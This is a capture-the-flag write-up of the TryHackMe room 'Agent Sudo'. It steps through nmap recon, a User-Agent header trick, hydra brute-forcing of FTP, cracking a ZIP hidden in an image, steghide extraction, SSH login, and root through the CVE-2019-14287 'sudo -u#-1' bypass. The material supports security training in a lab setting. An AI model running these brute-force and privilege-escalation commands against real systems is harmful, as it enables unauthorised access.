---
title: "Agent Sudo: Turning Weak Signals into Root"
date: 2026-04-10 09:00:00 +0300
category: cybersecurity
subcategories:
  - ctf
  - credential-access
  - privilege-escalation
tags:
  - CTF
  - TryHackMe
  - FTP
  - Steganography
  - sudo
  - Privilege Escalation
type: technical-breakdown
summary: "A web hint, weak FTP credentials, hidden data in images, and a sudo weakness combine into a steady path from recon to root."
featured: false
---

Machine: [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

## Introduction

Agent Sudo is a good example of how small signals become useful only after they survive verification. The room never handed over a clean path up front. It started with a strange web hint, moved through weak FTP credentials and hidden data inside image files, and ended with a local privilege escalation through a vulnerable `sudo` configuration. What made it worth documenting was not the tooling. It was the way each step had to be tested before it became trustworthy.

## Initial Enumeration

I began with a full scan to keep the attack surface honest before chasing any one service.

```bash
nmap -sC -sV -p- TARGET_IP
```

The result was narrow:

```text
21/tcp  open  ftp   vsftpd 3.0.3
22/tcp  open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.29
```

With only FTP, SSH, and HTTP exposed, the room looked compact enough that any real lead would matter quickly. Anonymous FTP access failed, so there was no easy win on port 21:

```bash
ftp TARGET_IP
```

```text
Name: anonymous
530 Login incorrect.
```

That made the website the best place to start. If FTP needed credentials, HTTP was the most likely place to leak them.

## Chasing the User-Agent Hint

The homepage returned a message that immediately changed the shape of the enumeration:

```bash
curl http://TARGET_IP
```

```text
Dear agents,
Use your own codename as user-agent to access the site
From,
Agent R
```

At that point I stopped treating the site like a normal web target and focused on the `User-Agent` header instead. A few obvious guesses changed the response, but not in a useful way. I also tried sweeping `A` through `Z` and filtering for differences, but that produced noisy output because the page content did not line up cleanly with the string I was excluding.

Rather than keep arguing with the HTML, I reduced the problem to something measurable and compared response sizes:

```bash
for i in {A..Z}; do echo -n "$i "; curl -s -A "$i" http://TARGET_IP | wc -c; done
```

Most values returned the same length. A few stood out. Testing those individually led to the first real piece of information:

```bash
curl -A "C" http://TARGET_IP
```

```text
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP
Also, change your god damn password, is weak!
From,
Agent R
```

That was enough to stop guessing broadly. I now had a username, `chris`, and a direct hint about password quality. With that, FTP became a much better target than SSH. A weak password on FTP was plausible, and it was a lower-friction place to validate the lead.

## Validating the Lead Through FTP

I used the clue as directly as possible and attacked the FTP service with a wordlist:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
```

Hydra recovered valid credentials:

```text
[21][ftp] host: TARGET_IP   login: chris   password: crystal
```

That was the first point where the room's hints proved they were operational and not just thematic. Logging into FTP exposed three files:

```bash
ftp TARGET_IP
ls
```

```text
To_agentJ.txt
cute-alien.jpg
cutie.png
```

The mix of a message file and two images fit the pattern from the website well enough that it was worth staying on that track rather than branching out into wider web enumeration.

## Working Through the Files

The first note narrowed the next move:

```bash
cat To_agentJ.txt
```

```text
Dear agent J,
All these alien like photos are fake!
Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.
It shouldn't be a problem for you.
From,
Agent C
```

That told me the images were not decoration and that one of them carried the next credential. I started with `cutie.png` and checked it with `binwalk`:

```bash
binwalk cutie.png
```

```text
DECIMAL       HEXADECIMAL     DESCRIPTION
34562         0x8702          Zip archive data, encrypted, name: To_agentR.txt
```

This was a good lead, but it still took a bit of handling. Automatic extraction did not work cleanly:

```bash
binwalk -e cutie.png
```

```text
WARNING: One or more files failed to extract
```

So I extracted the archive manually from the offset `binwalk` identified:

```bash
dd if=cutie.png of=secret.zip bs=1 skip=34562
```

Trying to open it directly with `unzip` did not get me very far either:

```bash
unzip secret.zip
```

```text
skipping: To_agentR.txt  need PK compat. v5.1 (can do v4.6)
```

At that point the ZIP was clearly part of the path, but not one I was going to open without cracking first. I converted it for John and attacked it with the same wordlist:

```bash
zip2john secret.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the ZIP password:

```text
alien
```

Inside was another short note:

```bash
cat To_agentR.txt
```

```text
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible.
By,
Agent R
```

The string decoded neatly from Base64:

```bash
echo QXJlYTUx | base64 -d
```

```text
Area51
```

That still was not self-explanatory. It could have been a password, a directory name, or just another decoy. The earlier note about credentials being hidden in the fake picture made it more likely that this belonged to the image workflow than to a network service, so I checked the JPEG next.

`binwalk` on `cute-alien.jpg` did not show the same kind of embedded archive, which made the split between the two image files useful: the PNG had been carrying an encrypted ZIP, so the JPEG likely needed a different approach.

That made `steghide` the sensible next step. Using `Area51` as the passphrase extracted another file:

```bash
steghide extract -sf cute-alien.jpg
cat message.txt
```

```text
Hi james,
Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
chris
```

Now the next move was concrete. I had what looked like a clean SSH credential pair: `james` and `hackerrules!`.

## SSH Access

I used the recovered credentials over SSH:

```bash
ssh james@TARGET_IP
```

Once inside, I verified the account and read the user flag:

```bash
whoami
cat user_flag.txt
```

```text
james
b03d975e8c92a7c04146cfa7a5a313c7
```

By this point the room had settled into a consistent pattern: each clue only became useful after I placed it against the right surface. `chris` mattered because FTP was open. `Area51` mattered because the image workflow still had unresolved pieces. Nothing here was especially difficult, but it punished assuming too much too early.

## Privilege Escalation

From the `james` shell, I checked `sudo` rights first:

```bash
sudo -l
```

The result was the final pivot:

```text
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

That entry looked restrictive, but only if the installed `sudo` version enforced it correctly. On a target vulnerable to CVE-2019-14287, the `!root` restriction can be bypassed by specifying user ID `-1`, which is interpreted as `0`.

I tested it directly:

```bash
sudo -u#-1 /bin/bash
whoami
```

```text
root
```

That dropped me into a root shell. From there, the final flag was waiting under `/root`:

```bash
cd /root
cat root.txt
```

```text
b53a02f55b57d4439e3341834d70c062
```

## Conclusion

The full chain was compact but disciplined: a header-based web clue exposed `chris`, a weak FTP password opened the right directory, the files inside it yielded a ZIP password, a steganography passphrase, and then SSH credentials for `james`, and the box ended with CVE-2019-14287 through a `sudoers` rule that looked safer than it was.

The useful lesson here was not that any one step was clever. It was that weak signals only become reliable when they survive contact with the next decision. The web hint mattered because it produced a username that worked. The recovered strings mattered because they matched the stage of the attack I was in. The final escalation made the same point from the defensive side: policy is not protection when the binary enforcing it is flawed. A `sudo` rule that appears to exclude `root` is still unsafe if the installed version can be made to interpret that restriction away.
